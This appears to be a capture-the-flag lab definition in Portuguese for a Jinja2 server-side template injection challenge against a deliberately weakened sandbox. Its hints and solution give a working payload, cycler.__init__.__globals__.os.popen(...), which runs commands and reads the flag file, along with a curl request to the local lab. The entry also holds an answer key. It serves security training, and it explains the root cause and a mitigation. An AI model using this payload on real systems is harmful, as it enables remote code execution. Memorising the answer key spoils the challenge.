@@ -1,0 +1,81 @@
+{
+  "slug": "server-ssti-jinja-sandbox",
+  "title": "Em sandbox, disseram",
+  "codename": "PAPERFORM",
+  "summary": "O Paperform renderiza templates de operadores através de um Jinja SandboxedEnvironment customizado. A allow-list foi ampliada para que previews pudessem introspectar helpers, e o escape genérico do Jinja está aberto de novo: leia o segredo do host de cobrança.",
+  "category": "server",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "server-ssti-jinja-sandbox",
+  "estimated_minutes": 35,
+  "xp": 240,
+  "tech": [
+    "Flask",
+    "Jinja2",
+    "Python"
+  ],
+  "tags": [
+    "ssti",
+    "template-injection",
+    "sandbox-escape",
+    "jinja2"
+  ],
+  "story": "Operadores de cobrança queriam texto de fatura voltado ao cliente sem um deploy. A equipe de plataforma respondeu com um sandbox Jinja customizado: o acesso normal a atributos é irrestrito, e todo dunder além de uma curta deny-list é permitido para que previews possam introspectar objetos helper. Os templates vêm de operadores confiáveis, então o risco foi aceito em uma revisão de design.",
+  "objective": "Escape o sandbox do Jinja a partir do preview de templates e leia `/tmp/redvault-ssti-jinja-sandbox.txt`.",
+  "rules": "Mantenha o exploit dentro do processo do lab. Nenhum ataque contra a plataforma ou o host subjacente.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo do host de cobrança",
+      "flag_type": "root",
+      "points": 240,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Confirme a avaliação",
+      "body": "Abra `/preview` com `body={{ 7*7 }}`. Um `49` renderizado significa que o body é compilado como template. `/sandbox` explica que se trata de um `SandboxedEnvironment` com uma allow-list ampliada.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Encontre uma passagem pelo sandbox",
+      "body": "A allow-list permite a maioria dos atributos dunder. O Jinja expõe o global `cycler`; `cycler.__init__.__globals__` são os globals do módulo de uma função, o pivô clássico de sandbox.",
+      "cost": 35
+    },
+    {
+      "level": 3,
+      "title": "Leia o arquivo",
+      "body": "Renderize `body={{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-jinja-sandbox.txt').read() }}`. O preview contém a flag e o objetivo é registrado.",
+      "cost": 45
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. `GET /preview?body={{7*7}}` retorna `49`, então o body é compilado como template.\n2. `GET /preview?body={{ ''.__class__ }}` retorna `<class 'str'>`, então o acesso a dunder não está bloqueado.\n3. Cruze de dados para código através de um global do Jinja:\n```jinja\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n```\nO preview mostra a saída do comando.\n4. Leia o arquivo de flag:\n```bash\ncurl -G --data-urlencode \"body={{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-jinja-sandbox.txt').read() }}\" http://127.0.0.1:PORT/preview\n```\n5. O preview renderizado contém a flag. Envie-a.",
+    "root_cause": "Server-side template injection que derrota um sandbox deliberadamente enfraquecido. `SandboxedEnvironment.is_safe_attribute` foi sobrescrito para permitir quase todo atributo, incluindo `__globals__`, que é exatamente o escape genérico que o sandbox existe para bloquear. Negar apenas `__mro__`, `__bases__`, `__code__` e `__reduce__` deixa o caminho `function.__globals__` aberto.",
+    "mitigation": "Não compile entrada do usuário como template. Onde templates dinâmicos forem um requisito rígido, mantenha a allow-list padrão do `SandboxedEnvironment`, exponha apenas dados no contexto e rode a renderização em um processo separado de baixo privilégio. Adicionar nomes a uma deny-list de dunders não é um controle de segurança porque o interpretador expõe muitos caminhos equivalentes."
+  },
+  "references": [
+    {
+      "title": "Jinja2 — Sandboxed Environment",
+      "url": "https://jinja.palletsprojects.com/en/stable/sandbox/",
+      "source_type": "official",
+      "description": "API do sandbox, incluindo o hook is_safe_attribute que este lab sobrescreve."
+    },
+    {
+      "title": "PortSwigger — Server-side template injection",
+      "url": "https://portswigger.net/web-security/server-side-template-injection",
+      "source_type": "official",
+      "description": "Técnicas de detecção, exploração e bypass de sandbox."
+    },
+    {
+      "title": "OWASP WSTG — Testing for SSTI",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
+      "source_type": "standard",
+      "description": "Metodologia para testar injeção de templates em diferentes engines."
+    }
+  ]
+}
